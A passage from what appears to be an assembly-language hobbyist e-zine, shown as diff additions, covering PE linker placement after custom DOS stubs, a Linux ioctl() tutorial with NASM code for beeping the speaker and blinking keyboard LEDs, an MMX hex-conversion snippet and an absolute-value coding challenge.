+The only problem with Microsoft's linker is that it doesn't seem to want to
+link the PE block right after the DOS stub. Maybe other linkers do, but I
+haven't found one that does yet. Microsoft's linker just dumps some garbage,
+and then puts its PE block at offset 78h. Maybe that is because their stub is
+78h bytes long and they don't consider shorter stubs?
+The offset at which the PE block is linked depends on the initial SP value
+specified at offset 10h, actually (why is that?). It can also link at offset
+80h or 88h.
+You could move the PE block to offset 40h, and pad with 0's after the PE block,
+using a hex-editor. This way it will compress even better, maybe. And you
+could perhaps edit the PE block and move the code forward a bit too (there's a
+great util in this. Shall we make it?).
+
+Well, anyway... Have fun, and get crazy with your custom DOS stubs!
+
+And remember:
+
+DOS Knowledge is power!
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::............................................THE.UNIX.WORLD
+																						 Using ioctl()
+																				         by mammon_
+		
+
+One of the most famous Unix maxims reads 'everything is a file'; directories
+are files, pipes are files, hardware devices are files, even files are files.
+This provided a transparent means or reading and writing hardware or software
+constructs such as modems and sockets; yet the lack of interrupts or device
+driver routines is sometimes confusing for those not used to Unix programming. 
+In linux, handling device parameters through the character and block 'special 
+file' interface is handled through ioctl().
+
+The ioctl() system call takes a file descriptor and a request type as its 
+primary arguments, along with an optional third argument referred to as "argp"
+which contains any arguments that must be passed along with the request. The 
+possible ioctl() requests can be found by poking around in the $INCLUDE/asm and
+$INCLUDE/linux header files, although a somewhat dated list of requests can be 
+viewed by typing 'man ioctl_list'. 
+
+One of the most useful devices to program with ioctl() for the applications 
+programmer will be the console; in linux terms, this consists of the keyboard 
+and display, such that all 63 of the Virtual Consoles can be controlled with 
+ioctl(). This can be useful if one wants to output debugging information to a
+non-visible console, or to transfer STDIN and STDOUT to a newly-allocated 
+console while disabling virtual console switching, effectively tying the user 
+to a single console [e.g., in a walkup workstation]. 
+
+Information on console ioctl requests can be found with 'man console_ioctl'. 
+Bringing up this man page instantly displays the following text:
+       WARNING: If you use  the  following  information  you  are
+       going to burn yourself.
+
+       WARNING:  ioctl's are undocumented Linux internals, liable
+       to be changed without warning.  Use POSIX functions.
+This is ancient asm coderspeak meaning 'you are on the right track, keep going.'
+
+Perusing the listed requests will provide enough information to code that first
+exercise from DOS-ASM 1o1: generating a tone on the PC speaker.
+       KDMKTONE
+       Generate  tone  of  specified length.  The lower 16
+       bits of argp specify the period  in  clock  cycles,
+       and  the  upper  16 bits give the duration in msec.
+       If the duration is zero, the sound is  turned  off.
+       Control  returns  immediately.  For example, argp =
+       (125<<16) + 0x637 would specify the  beep  normally
+       associated  with  a  ctrl-G.   (Thus since 0.99pl1;
+       broken in 2.1.49-50.)
+		 
+This should not be too terribly hard to implement -- a call to open the file 
+descriptor, and a single call to ioctl() to sound the tone. First things first,
+open() is called on /dev/tty to create a handle for the current console:
+#-------------------------------------------------------------------beep.asm
+%define O_RDWR 2					;grep O_RDWR /usr/include/asm/*
+%define KDMKTONE 0x4B30 		;grep KDMKTONE /usr/include/linux/*
+EXTERN open
+GLOBAL main
+
+section .data
+szTTY db '/dev/tty',0
+
+section .text
+main:
+		  push dword O_RDWR
+		  push dword szTTY
+		  call open
+		  add esp, 8
+#--------------------------------------------------------------------BREAK
+
+Next, calculate the frequency and duration of the tone to be played:
+#---------------------------------------------------------------------CONT
+		  mov dx, 666			;duration
+		  shl edx, 16
+		  or dx, 1199			;tone
+#--------------------------------------------------------------------BREAK
+
+Now, normally one might call ioctl as so:
+		  push edx
+		  push dword KDMKTONE
+		  push eax
+		  call ioctl
+		  add esp, 12
+
+However, ioctl is a systemcall, and we can save a bit of time by going
+straight through the syscall gate at 0x80:
+#---------------------------------------------------------------------CONT
+		  mov ebx, eax
+		  mov ecx, KDMKTONE
+		  mov eax, 54				;ioctl func defined in /usr/include/asm/unistd.h
+		  int 0x80
+		  ret
+#----------------------------------------------------------------------EOF
+
+So much for the simple beep. Another ASM 101 favorite is the 'blinking LED'
+trick, where students learn to make the keyboard LEDs blink on and off in any 
+number of psychedelic patterns. A quick tour through the man page shows the 
+requests needed for this sample as well:
+
+       KDGETLED
+       Get state of LEDs.  argp points to a long int.  The
+       lower  three  bits of *argp are set to the state of
+       the LEDs, as follows:
+           LED_CAP       0x04   caps lock led
+           LED_NUM       0x02   num lock led
+           LED_SCR       0x01   scroll lock led
+       KDSETLED
+       Set the LEDs.  The LEDs are set  to  correspond  to
+       the lower three bits of argp.  However, if a higher
+       order bit is set, the LEDs revert to  normal:  dis-
+       playing the state of the keyboard functions of caps
+       lock, num lock, and scroll lock.
+
+The file descriptor must be opened as with the previous example. From there, 
+we must get the current LED state:
+#--------------------------------------------------------------------led.asm
+		 
+%define KDGETLED        0x4B31         ;grep KDGETLED /usr/include/linux/*
+%define KDSETLED        0x4B32         ;grep KDSETLED /usr/include/linux/*
+
+		  xor edx, edx
+		  mov ecx, KDGETLED
+		  mov ebx, eax
+		  mov eax, 54
+		  int 0x80
+#--------------------------------------------------------------------BREAK
+
+Next, all of the LEDs will be turned on and then off 10 times. It is vital 
+to the success of the algorithm that a delay be present between the off and 
+on transitions; otherwise the LEDs will appear to be steadily lit, and that
+is much less of a programming achievement:
+#---------------------------------------------------------------------CONT
+		  mov ecx, 10
+.here:
+		  push ecx						;save counter
+		  or edx, 0x07					;set all of 'em
+		  mov ecx, KDSETLED
+		  mov eax, 54
+		  int 0x80
+
+		  mov ecx, 0xFFFFFF			;delay counter
+.delay:
+		  loop .delay
+
+		  and edx, 0					;turn all of them off
+		  mov ecx, KDSETLED
+		  mov eax, 54
+		  int 0x80
+
+		  mov ecx, 0xFFFFFF			;next delay counter
+.delay2:
+		  loop .delay2
+
+		  pop ecx
+		  loop .here
+
+		  ret
+#----------------------------------------------------------------------EOF
+Blinking the LEDs in succession and achieving hypnotic frequency via ioctl() 
+will be left as an exercise to the reader.
+
+This should provide a quick introduction to using ioctl(). There are many more 
+possibilities available for scan codes, screen painting, and virtual console 
+control; further opportunities for console amusement exist also within the realm 
+of escape-sequence programming. The examples presented here can be compiled with
+the standard
+    nasm -f elf file.asm
+	 gcc -o file file.o
+combination, or by using a Makefile:
+#----------------------------------------------------------------------Makefile
+TARGET =beep					  #TARGET is the variable storing the base filename 
+
+ASM = nasm                   #ASM contains the name of the assembler
+ASMFILE = $(TARGET).asm      #ASMFILE contains the full name of the source file
+OBJFILE = $(TARGET).o        #OBJFILE contains the full name of the object file
+LINKER = gcc                 #LINKER contains the full name of the linker
+LIBS =                       #LIBS contains any library flags
+LIBDIR =                     #LIBDIR contains any library location flags
+
+all:                         #the 'all:' section applies to all targets
+	$(ASM) -o $(OBJFILE) -f elf $(ASMFILE)
+	$(LINKER) -o $(TARGET) $(OBJFILE) $(LIBDIR) $(LIBS)
+#---------------------------------------------------------------------------EOF
+As with all Makefiles, with the target correctly set the source will be compiled
+and linked simply by typing 'make' in the directory where the Makefile is 
+located.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::................................ASSEMBLY.LANGUAGE.SNIPPETS
+																			  BinToString
+                                                           by Cecchinel Stephan
+
+
+;Summary:       Converts a 32 bit number to an 8-byte string.
+;Compatibility: MMX+
+;Notes:			 14 cycles. Input is stored in EAX; the output is a hex-
+;               format character string pointed to by [EDI]. 	
+Sum1:     dd 	0x30303030, 0x30303030
+Mask1:    dd 	0x0f0f0f0f, 0x0f0f0f0f
+Comp1:    dd 	0x09090909, 0x09090909
+Hex32:
+        bswap 	eax
+        movq 	mm3,[Sum1]
+        movq 	mm4,[Comp1]
+        movq 	mm2,[Mask1]
+        movq 	mm5,mm3
+        psubb 	mm5,mm4
+        movd 	mm0,eax
+        movq 	mm1,mm0
+        psrlq 	mm0,4
+        pand 	mm0,mm2
+        pand 	mm1,mm2
+        punpcklbw mm0,mm1
+        movq 	mm1,mm0
+        pcmpgtb mm0,mm4
+        pand 	mm0,mm5
+        paddb 	mm1,mm3
+        paddb 	mm1,mm0
+        movq 	[edi],mm1
+        ret
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................ISSUE.CHALLENGE
+                                                              Absolute Value
+																				  by Laura Fairhead
+ 
+
+The Challenge
+-------------
+Find the absolute value of a register in only 4 bytes.
+
+The Solution
+------------
+ 
+        NEG AX
+        JL SHORT $-4
+
+This was not completely my original idea (is there such thing??); I
+found a similar sequence which used the more obvious branch 'JS'. The
+JS had the problem that it goes into an infinite loop if AX=08000h.
+
+
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::.......................................................FIN
